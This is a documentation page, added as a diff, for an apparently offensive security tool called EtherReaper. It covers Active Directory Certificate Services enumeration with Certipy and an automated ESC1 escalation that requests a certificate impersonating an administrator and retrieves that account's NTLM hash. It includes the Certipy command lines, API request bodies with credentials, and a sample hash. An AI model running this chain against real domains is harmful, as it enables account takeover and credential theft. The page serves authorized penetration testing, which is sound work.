@@ -1,0 +1,200 @@
+---
+title: 'ADCS'
+description: 'Certificate Services vulnerability enumeration via Certipy and automated ESC1 privilege escalation to obtain a Domain Admin NTLM hash.'
+---
+
+EtherReaper integrates [Certipy](https://github.com/ly4k/Certipy) for Active Directory Certificate Services (ADCS) enumeration and exploitation. The workflow covers scanning for misconfigurations (ESC1–ESC8+), reviewing discovered vulnerabilities, and executing a fully automated ESC1 attack chain.
+
+## ADCS scan
+
+Runs `certipy-ad find` to enumerate certificate authorities and templates, identifying misconfigurations across the ESC1–ESC8+ vulnerability classes.
+
+**Endpoint:** `POST /api/adcs/run`
+
+**Under the hood:** Runs `certipy-ad find -u <user>@<domain> -p <pass> -target <dc_ip> -dc-ip <dc_ip> -enabled -hide-admins [-vulnerable] -stdout -json -output <domain>`. Certipy writes a JSON file to `/tmp/<domain>_Certipy.json`, which EtherReaper moves to `recon/adcs.json` and then imports into the `adcs_vulns` table.
+
+**Request body:**
+
+```json
+{
+  "target": "192.168.1.10",
+  "username": "jdoe",
+  "password": "Password123",
+  "domain": "corp.local",
+  "vulnerable_only": true,
+  "use_kerberos": false,
+  "use_kcache": false
+}
+```
+
+| Field | Default | Description |
+|---|---|---|
+| `target` | DC IP from Network Info | Target DC IP or domain name |
+| `vulnerable_only` | `true` | When `true`, passes `-vulnerable` to Certipy and imports only vulnerable objects. When `false`, imports all templates and CAs with their vulnerable status. |
+
+**Output file:** `recon/adcs.json`
+
+<Note>
+The ADCS scan runs in-process (not as a background task). It waits for Certipy to finish before returning. On large environments with many templates this can take 30–60 seconds.
+</Note>
+
+## Viewing vulnerabilities
+
+**Endpoint:** `GET /api/adcs/vulns`
+
+Returns all records from the `adcs_vulns` table, ordered by object type (CAs first), then vulnerability severity, then ESC ID.
+
+```json
+{
+  "vulns": [
+    {
+      "esc_id": "ESC1",
+      "vuln_object": "UserTemplate",
+      "object_type": "Template",
+      "vulnerable": 1,
+      "enabled": 1,
+      "enrollment_rights": "Domain Users",
+      "details": "Enrollee supplies subject, Client Auth enabled",
+      "manager_approval": 0,
+      "remarks": "..."
+    }
+  ]
+}
+```
+
+### adcs_vulns table schema
+
+| Column | Description |
+|---|---|
+| `scan_id` | UUID of the scan that discovered this entry |
+| `target` | DC IP used during the scan |
+| `esc_id` | ESC identifier (e.g. `ESC1`, `ESC3`, `N/A` for non-vulnerable) |
+| `vuln_object` | Certificate template or CA name |
+| `object_type` | `Template` or `CA` |
+| `vulnerable` | `1` if vulnerable, `0` if not |
+| `enabled` | `1` if the template is enabled in AD |
+| `enrollment_rights` | Principals allowed to enroll (e.g. `Domain Users`) |
+| `details` | Vulnerability details: ESC description, enrollee subject flag, client auth status |
+| `manager_approval` | `1` if the template requires manager approval before issuance |
+| `remarks` | Raw Certipy vulnerability description |
+
+## Managing vulnerability records
+
+**Bulk delete:** `POST /api/adcs/bulk-delete`
+
+Remove selected vulnerability records from the database. Useful for cleaning up false positives or cleared findings.
+
+```json
+{
+  "entries": [
+    {"object": "UserTemplate", "type": "Template"},
+    {"object": "corp-CA", "type": "CA"}
+  ]
+}
+```
+
+**List ESC1 templates:** `GET /api/adcs/esc1-templates`
+
+Returns all `Template` records with `esc_id = ESC1` and `vulnerable = 1` from the last scan, plus the CA name and hostname — used to auto-populate the ESC1 attack form.
+
+```json
+{
+  "templates": [
+    {"name": "UserTemplate", "enrollment_rights": "Domain Users"}
+  ],
+  "ca_name": "corp-CA",
+  "ca_host": "ca.corp.local"
+}
+```
+
+## ESC1 attack
+
+The ESC1 attack exploits certificate templates that allow the enrollee to supply an arbitrary Subject Alternative Name (SAN). This lets a low-privilege user request a certificate impersonating any domain account, including Domain Admin.
+
+EtherReaper runs the full three-step Certipy chain automatically.
+
+**Endpoint:** `POST /api/adcs/esc1/run`
+
+<Steps>
+  <Step title="Query objectSid">
+    Runs `certipy-ad account ... read` to retrieve the `objectSid` of the target account (the UPN you want to impersonate). The SID is used as a fallback identifier during certificate request.
+  </Step>
+  <Step title="Request certificate">
+    Runs `certipy-ad req` with the vulnerable template, CA host, CA name, and the target UPN. The certificate is saved as a `.pfx` file in `recon/`. Timeout: 180 seconds.
+  </Step>
+  <Step title="Authenticate with certificate">
+    Runs `certipy-ad auth -pfx <file> -dc-ip <dc_ip>` to authenticate using the certificate and retrieve the NTLM hash for the impersonated account. The hash is automatically saved to the credentials database with source `certipy-ESC1`.
+  </Step>
+</Steps>
+
+**Required parameters:**
+
+```json
+{
+  "username": "jdoe",
+  "password": "Password123",
+  "domain": "corp.local",
+  "dc_ip": "192.168.1.10",
+  "ca_host": "ca.corp.local",
+  "ca_name": "corp-CA",
+  "template": "UserTemplate",
+  "upn": "administrator"
+}
+```
+
+| Field | Description |
+|---|---|
+| `username` / `password` | Your enrolling account credentials |
+| `domain` | Target domain |
+| `dc_ip` | Domain controller IP |
+| `ca_host` | CA server hostname (auto-filled from last ADCS scan) |
+| `ca_name` | Certificate authority name (auto-filled from last ADCS scan) |
+| `template` | Vulnerable ESC1 template name (auto-populated from last ADCS scan) |
+| `upn` | Target account to impersonate (e.g. `administrator`) |
+
+<Tip>
+`ca_host`, `ca_name`, and `template` are auto-populated from the last ADCS scan. You only need to fill in the `upn` — the account to impersonate.
+</Tip>
+
+### Checking ESC1 status
+
+The ESC1 attack runs as a background task. Poll for status using:
+
+**Endpoint:** `GET /api/adcs/esc1/status?scan_id=<scan_id>`
+
+```json
+{
+  "status": "completed",
+  "phase": "auth",
+  "output": "...",
+  "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe",
+  "scan_id": "..."
+}
+```
+
+Possible `status` values: `running`, `completed`, `error`. Possible `phase` values: `sid`, `req`, `auth`.
+
+### Where the attack is accessible
+
+The ESC1 attack can be launched from three places:
+
+<CardGroup cols={3}>
+  <Card title="Sidebar" icon="sidebar">
+    Direct link in the AD Authenticated section.
+  </Card>
+  <Card title="ADCS scan results" icon="shield-check">
+    Launch button appears inline on the ADCS vulnerability results page next to ESC1 findings.
+  </Card>
+  <Card title="Domain Info → ADCS tab" icon="database">
+    Available under DATA → Domain Info when ADCS data has been collected.
+  </Card>
+</CardGroup>
+
+### Result
+
+If the attack succeeds, the NTLM hash for the impersonated account is:
+1. Displayed in the output panel
+2. Saved automatically to the credentials database (source: `certipy-ESC1`)
+3. Available immediately in the Saved Credentials dropdown for subsequent scans
+
+Any `.ccache` files produced by Certipy are moved from `recon/` into `recon/ccache/` automatically.
